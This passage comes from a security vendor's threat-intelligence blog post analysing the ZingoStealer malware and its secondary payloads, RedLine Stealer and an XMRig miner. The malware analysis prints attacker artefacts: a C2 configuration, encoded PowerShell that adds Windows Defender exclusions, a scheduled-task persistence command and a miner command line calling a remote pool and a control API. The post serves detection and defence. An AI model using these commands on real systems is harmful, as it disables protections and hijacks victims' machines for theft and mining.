+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCuGWT1glsSOVob4Aw1d8B6Q8dC8mYduNUGrqdnL3dhHjVyx5TU1NH3T8S4ShrACmsVzFVb1r_amyttTGDV47FGqG3UT16UDv7eZcEXKu8i5YYfZfet810YFLlKD96IAU6-pmcK05zq1kNwu2O3GiaNCQAWvPT8rF3-wr3pxFvsVaVVWgsJLd-r-E-JA/s1600/image18.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCuGWT1glsSOVob4Aw1d8B6Q8dC8mYduNUGrqdnL3dhHjVyx5TU1NH3T8S4ShrACmsVzFVb1r_amyttTGDV47FGqG3UT16UDv7eZcEXKu8i5YYfZfet810YFLlKD96IAU6-pmcK05zq1kNwu2O3GiaNCQAWvPT8rF3-wr3pxFvsVaVVWgsJLd-r-E-JA/s1600/image18.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Decryption() function.
+Finally, the second array is passed back to the Main() function, saved to disk as ZingoStealer, and executed to continue the infection process.
+<h2 id="h.md2ma51t126l">RedLine Stealer</h2>
+One of the secondary payloads delivered and executed by ZingoStealer is <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer">RedLine Stealer</a>, a well-known information stealer that has been analyzed extensively over the past couple of years. It features significantly more support for retrieving data from various applications, browsers, cryptocurrency wallets and extensions. 
+Below is a basic comparison between the two stealers as it relates to supported applications from which the malware can retrieve sensitive data to be exfiltrated to the attacker.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYXVEzdNsGLZp4YU3qoImnlmcB-AAJl8rPEtxI2wChFn8ZVvIOViQQTgn0RzubP7fbPWpRMG0GPuByUkpZGH10MCGoZB953ZMeTJ-v6uFeV-D4LdDuMC9-AWdulsn8LzhZNJoUb7ajYghJqSYgh8-BV6rN1z0e5MwNhAptPw-WU4ELPMTnj6eiApcV5Q/s1600/image17.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYXVEzdNsGLZp4YU3qoImnlmcB-AAJl8rPEtxI2wChFn8ZVvIOViQQTgn0RzubP7fbPWpRMG0GPuByUkpZGH10MCGoZB953ZMeTJ-v6uFeV-D4LdDuMC9-AWdulsn8LzhZNJoUb7ajYghJqSYgh8-BV6rN1z0e5MwNhAptPw-WU4ELPMTnj6eiApcV5Q/s1600/image17.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Stealer feature comparison.
+Given that RedLine Stealer seems to provide more capabilities, why would an adversary use ZingoStealer to deliver RedLine Stealer? 
+Besides ZingoStealer, the malware author also offers additional services that they advertise within the Haskers Gang community. One service is a "log access service" used to monetize information stealer logs obtained from previously infected systems. Customers can purchase access to the log data generated from various stealers operated by the attacker, which provides them sensitive account information that can be further leveraged for a variety of purposes including initial access, fraud, etc.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJC5r1GZT4kn1UdjmiRgCmlRANL3GSy9Qc15Eea3jec01iJfxlOSRz24tT3EpEa-FxudBcHuP2jHL742nAP5QJ6uSgROgeofZgn4EiGdqkq4RQL33KNLRSpHTrJJdGnwOSOwHr4kt1INmq7-P1TUHO-e7eVJkW6dBQC6SQcMtC4PVZzubBQ_TWsjR-qg/s1600/image1.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJC5r1GZT4kn1UdjmiRgCmlRANL3GSy9Qc15Eea3jec01iJfxlOSRz24tT3EpEa-FxudBcHuP2jHL742nAP5QJ6uSgROgeofZgn4EiGdqkq4RQL33KNLRSpHTrJJdGnwOSOwHr4kt1INmq7-P1TUHO-e7eVJkW6dBQC6SQcMtC4PVZzubBQ_TWsjR-qg/s1600/image1.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Advertisement for the logging service.
+The malware author behind ZingoStealer assures ZingoStealer users that they do not access log data generated by ZingoStealer. 
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjuPjHb_BZhFYvZI0_ysQ5QmQP9lewkm8KHad27_M5Iqymd0MdV_tiMOkZitUkPka6uhw35YXpzIXVWX1jDyBiJ04XXU5jrsnTpYIj9bzy7yseaJYmQKlcYMczB-ztwq0ZuVrLRPgdwJF6ky_-jXCCaUbL86GgGXQ31IC-8QJ2fkfiauKVhcLARuUqg/s1600/image21.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjuPjHb_BZhFYvZI0_ysQ5QmQP9lewkm8KHad27_M5Iqymd0MdV_tiMOkZitUkPka6uhw35YXpzIXVWX1jDyBiJ04XXU5jrsnTpYIj9bzy7yseaJYmQKlcYMczB-ztwq0ZuVrLRPgdwJF6ky_-jXCCaUbL86GgGXQ31IC-8QJ2fkfiauKVhcLARuUqg/s1600/image21.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Actor's assurance they do not take interest in the uploaded stolen logs.
+However, by effectively backdooring ZingoStealer and using it to deliver RedLine Stealer, they can still take advantage of the infections achieved by ZingoStealer users. This allows them to let ZingoStealer users perform the heavy lifting in terms of malware distribution, antivirus evasion, and achieving successful infections, while they passively collect more comprehensive logs from the systems. This also allows them to monetize the infections of all ZingoStealer users simultaneously, maximizing profitability. 
+The RedLine Stealer configuration extracted from analyzed samples contained the following parameters.
+{"ip": "193[.]38[.]235[.]228:45347", "xor_key": "Zag", "id": "keepye"}
+The value "keepye" stored within the ID field of the configuration matches the username associated with an individual suspected to be behind development of ZingoStealer.
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSTkb5MQ81rpbmJHmFJ_dKXuzs962bFbhqpXP9qFSru7VYp53P2DGlOq-JL5SxB8ELHHIgiFftd1zzfHPAFKAini1iR4_2O4XB8-hskCuBb2JUsvXK6kH6gdT8blXf3ntHF2woa8zBKM6KBIFuaZPDU1cVDDgDyLukInl_PC0PEgSNZJV1snDuWnqCtw/s1600/image9.png"><img alt="" border="0" height="289" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSTkb5MQ81rpbmJHmFJ_dKXuzs962bFbhqpXP9qFSru7VYp53P2DGlOq-JL5SxB8ELHHIgiFftd1zzfHPAFKAini1iR4_2O4XB8-hskCuBb2JUsvXK6kH6gdT8blXf3ntHF2woa8zBKM6KBIFuaZPDU1cVDDgDyLukInl_PC0PEgSNZJV1snDuWnqCtw/w320-h289/image9.png" width="320"/></a>
+Threat actor social media profile.
+<h2 id="h.i0quorsq4u9a">ZingoMiner (XMRig)</h2>
+In addition to RedLine Stealer, ZingoStealer also delivers the XMRig cryptocurrency mining malware to victims. This is another way the malware author behind ZingoStealer is attempting to monetize the operations of ZingoStealer users. 
+This was confirmed when the author of ZingoStealer published an announcement within the Haskers Gang Telegram group informing the community that they had added XMRig to a new version of ZingoStealer as previously described.
+As mentioned, the main binary payload associated with the mining malware is retrieved and executed by ZingoStealer during the initial infection process. It is then executed using conhost.exe as shown below.
+"C:\Windows\System32\conhost.exe" "C:\Users\&lt;USERNAME&gt;\AppData\Local\209625.exe"
+Once executed, it invokes PowerShell using the EncodedCommand option, specifying Base64-encoded PowerShell commands to execute.
+cmd /c powershell -EncodedCommand "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEAAKAAkAGUAbgB2ADoAVQBzAGUAcgBQAHIAbwBmAGkAbABlACwAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQApACAALQBGAG8AcgBjAGUA" &amp; powershell -EncodedCommand "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIABAACgAJwBlAHgAZQAnACwAJwBkAGwAbAAnACkAIAAtAEYAbwByAGMAZQA=" &amp; exit"
+This PowerShell is responsible for creating two exclusions in the Windows Defender configuration on the system.
+Add-MpPreference -ExclusionPath @($env:UserProfile,$env:SystemDrive) -Force
+Add-MpPreference -ExclusionExtension @('exe','dll') -Force
+It also attempts to achieve persistence for the miner, ensuring that it is executed following system reboots. This is accomplished by creating a new scheduled task using the following syntax:
+schtasks /create /f /sc onlogon /rl highest /tn "updater" /tr "C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Chrome\updater.exe"
+Finally, the malware copies itself from its initial starting location to match the path defined in the scheduled task, and then executes the newly created executable.
+"C:\Windows\System32\conhost.exe" "C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Chrome\updater.exe"
+This executable is also responsible for creating and executing a binary located at:
+C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Windows\Telemetry\sihost64.exe
+It also creates a file at the following location:
+C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Windows\Libs\WR64.sys
+Finally, it invokes explorer.exe with the following parameters.
+C:\Windows\explorer.exe shpiczjxwdufjl0 Xji3FXYfqqI2timPThbgZueMNpSES88mLhMz2ywydJRha9S4YJkR8/KlqFio/vzAY7y//ZROYnArPXLiffwPB7VSAkqxepfHfbYtEaV9ZbG09TvsFZSeWUprFBo7GDeFyZN82BlqbmKu+LYQuLi1o3lpTnrEuI+w+ROIyEQlfrH1kxe7v5ZyMTykLuvzKB12uZQyWPXpZnzoYIaSsfQVgbo3AFAbtSIzYCh94bQRcoE1P8E4tQFOKubeJMJskpvnQyClXkTRVMzS2sAOTVxkjAc0k21wMVWzJDjdouMWWwNZhLjHIwvMUuamQYKSHjTfIHuA22mc0a10qDjedhQ1CDS4ms/9pEbmtFVmsHRocQ3T5wuzgNvm4PGsesA+g49VRrepbRinNIAI8bdG1bY1yD7L9P9c18WhFIoPFoeKm/9CuEWPwSCrM6sFckdJH3KOcM5q4HXbKWbGNu+FZ0cozh5/dI7Eq6McioO54FYr3HdTbUEBeiQbHaOfwhLB4agTGGAFm8cWgb8YrrXWK61Fmw==
+This injects XMRig into the explorer.exe process and begins the cryptocurrency mining operations. The XMRig client is launched with the following command line parameters:
+\Windows\explorer.exe --algo=rx/0 --randomx-no-rdmsr --url=pool[.]hashvault[.]pro:80 --user=47tAzTKZcJuCui5Bx2FPVoA7UvWoz1QvRCFF1Bpvej5yGJuPPBgqTC8NG95Q3sMwsYV34eonCD3RVSEpSdhxaPRKSiagNNi --pass= --cpu-max-threads-hint=30 --cinit-stealth-targets="Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe" --cinit-api="hxxps://control[.]nominally[.]ru/api/endpoint.php" --tls --cinit-idle-wait=5 --cinit-idle-cpu=90
+Infected systems periodically send beacon data to the API specified when XMRig was launched. These beacons are consistent with the following example:
+ {"computername":"&lt;HOSTNAME&gt;","username":"&lt;HOSTNAME&gt;","gpu":"&lt;REDACTED&gt;","remoteconfig":"","type":"xmrig","status":4,"uqhash":"&lt;REDACTED&gt;"} 
+Investigating the pool address specified by the malware shows that the hash rate has continued to increase as more systems are infected with ZingoStealer, however it has not proven to be very lucrative thus far. 
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNXRtYKOsoEcxGoAH-UL3y21plKbaXJ__lFwuMDjWMwk_BgCRtjJIjt29NNI_TLBl37QW-eRVKsXANkcebGHS6AB1q7kswBBcCEnkX0CIOSj-XjKmLTML4fF4cO8g6Gl95HFnMOzJAuwqN8aKKm6xHd-Njo4f6bmvoVkIbUNBrUZWGFKN9pkIU6IPWeA/s1600/image14.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNXRtYKOsoEcxGoAH-UL3y21plKbaXJ__lFwuMDjWMwk_BgCRtjJIjt29NNI_TLBl37QW-eRVKsXANkcebGHS6AB1q7kswBBcCEnkX0CIOSj-XjKmLTML4fF4cO8g6Gl95HFnMOzJAuwqN8aKKm6xHd-Njo4f6bmvoVkIbUNBrUZWGFKN9pkIU6IPWeA/s1600/image14.png" style="max-width:80%;height:auto;width:auto;"/></a>
+Mining Pool Statistics
+<h2 id="h.a5x3yyfp7d7z">Conclusion</h2>
+ZingoStealer is a relatively new information stealer being offered for free to members of the Haskers Gang Telegram group. It features the ability to steal sensitive information from victims and can download additional malware to infected systems. In many cases, this includes the RedLine Stealer and an XMRig-based cryptocurrency mining malware that is internally referred to as "ZingoMiner." While the malware is new, Cisco Talos has observed that it is undergoing consistent development and improvement and that the volume of new samples being observed in the wild continues to increase as more threat actors attempt to leverage it for nefarious purposes. In many of the distribution campaigns we have observed associated with ZingoStealer, threat actors appear to be targeting home users and distributing their malware under the guise of video game cracks, cheats, and other similar content. Users should be aware of the threats posed by these types of applications and should ensure that they are only executing applications distributed via legitimate mechanisms. 
+<h2 id="h.2729teoh7smc">Coverage</h2>
+Ways our customers can detect and block this threat are listed below.
+<a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html">Cisco Secure Endpoint</a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free <a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial">here.</a><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAXylzgDWOaUTfIc1jLI9QY35IILpeJOlCqwUuPv1OWSzY_ZQps-GQZxz8HgegiwdjseatPbegHGql1EuMS2ZiIs1Iy6JLc-gWuxDaZREz1l5StbiR4h-c5d2iNFVKXpc-ei_3rxplBCULCOpxJL0JwHH0g8kXAZLelA1Y93m_H5OaHnpHyACHEelhrA/s1196/image20.png"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAXylzgDWOaUTfIc1jLI9QY35IILpeJOlCqwUuPv1OWSzY_ZQps-GQZxz8HgegiwdjseatPbegHGql1EuMS2ZiIs1Iy6JLc-gWuxDaZREz1l5StbiR4h-c5d2iNFVKXpc-ei_3rxplBCULCOpxJL0JwHH0g8kXAZLelA1Y93m_H5OaHnpHyACHEelhrA/s320/image20.png" width="320"/></a>
+<a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> web scanning prevents access to malicious websites and detects malware used in these attacks.
+<a href="https://www.cisco.com/c/en/us/products/security/email-security/index.html">Cisco Secure Email</a> (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free <a href="https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial">here</a>.
+<a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html">Cisco Secure Firewall</a> (formerly Next-Generation Firewall and Firepower NGFW) appliances such as <a href="https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html">Threat Defense Virtual</a>, <a href="https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html">Adaptive Security Appliance</a> and <a href="https://meraki.cisco.com/products/appliances">Meraki MX</a> can detect malicious activity associated with this threat.
+<a href="https://www.cisco.com/c/en/us/products/security/threat-grid/index.html">Cisco Secure Malware Analytics</a> (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
+<a href="https://umbrella.cisco.com/">Umbrella</a>, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella <a href="https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial">here</a>.
+<a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. 
+Additional protections with context to your specific environment and threat data are available from the <a href="https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html">Firewall Management Center</a>.
+<a href="https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial">Cisco Duo</a> provides multi-factor authentication for users to ensure only those authorized are accessing your network. 
+Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.snort.org/products">Snort.org</a>. 
+The following Snort SIDs are applicable to this threat: 59145, 59160, 59500 and 59501.
+<h4 id="h.4u8hmtq61a32">Orbital Queries</h4>
+Cisco Secure Endpoint users can use <a href="https://orbital.amp.cisco.com/help/">Orbital Advanced Search</a> to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click <a href="https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/zingo_infostealer_file_artifact.yaml">here</a> and <a href="https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_redline_infostealer_directory.yaml">here</a>.
+<h2 id="h.d7789d4yzlzz">Indicators of Compromise</h2>
+Indicators of Compromise associated with this threat can be found <a href="https://talosintelligence.com/resources/415">here</a>.
+Posted by
+<a class="g-profile" href="https://www.blogger.com/profile/10442669663667294759" rel="author" title="author profile">
+Edmund Brumaghin
+</a>
+at
+<a class="timestamp-link" href="http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html" rel="bookmark" title="permanent link">7:59 AM</a>
+<a href="https://www.blogger.com/post-edit.g?blogID=1029833275466591797&amp;postID=4367814067552141200&amp;from=pencil" title="Edit Post">
+<img alt="" class="icon-action" height="18" src="https://img2.blogblog.com/img/icon18_edit_allbkg.gif" width="18"/>
+</a>
+Labels:
+<a href="http://blog.talosintelligence.com/search/label/information%20stealers" rel="tag">information stealers</a>,
+<a href="http://blog.talosintelligence.com/search/label/SecureX" rel="tag">SecureX</a>,
+<a href="http://blog.talosintelligence.com/search/label/threats" rel="tag">threats</a>
+Share This Post
+<a class="facebook" href="https://www.facebook.com/sharer.php?u=http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html&amp;text=Threat%20Spotlight:%20%22Haskers%20Gang%22%20Introduces%20New%20ZingoStealer" rel="nofollow" target="_blank" title="Share This On Facebook">
+<img alt="Facebook share" border="0" src="https://www.talosintelligence.com/assets/icon_fb-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+<a class="twitter" href="https://twitter.com/share?url=http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html&amp;text=Threat%20Spotlight:%20%22Haskers%20Gang%22%20Introduces%20New%20ZingoStealer" rel="nofollow" target="_blank" title="Tweet This">
+<img alt="Twitter share" border="0" src="https://www.talosintelligence.com/assets/icon_tw-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+<a class="linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html&amp;text=Threat%20Spotlight:%20%22Haskers%20Gang%22%20Introduces%20New%20ZingoStealer" rel="nofollow" target="_blank" title="Share This On Linkedin">
+<img alt="Linkedin share" border="0" src="https://www.talosintelligence.com/assets/icon_li-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+<a class="reddit" href="https://www.reddit.com/submit?url=http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html&amp;title=Threat%20Spotlight:%20%22Haskers%20Gang%22%20Introduces%20New%20ZingoStealer" rel="nofollow" target="_blank" title="Reddit This">
+<img alt="Reddit share" border="0" src="https://www.talosintelligence.com/assets/icon_re-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+<a href="mailto:?body=http://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html&amp;subject=Threat%20Spotlight:%20%22Haskers%20Gang%22%20Introduces%20New%20ZingoStealer">
+<img alt="Email This" border="0" src="https://www.talosintelligence.com/assets/icon_em-share_grey.svg" style="max-width:80%;height:auto;width:auto;"/>
+</a>
+</div>
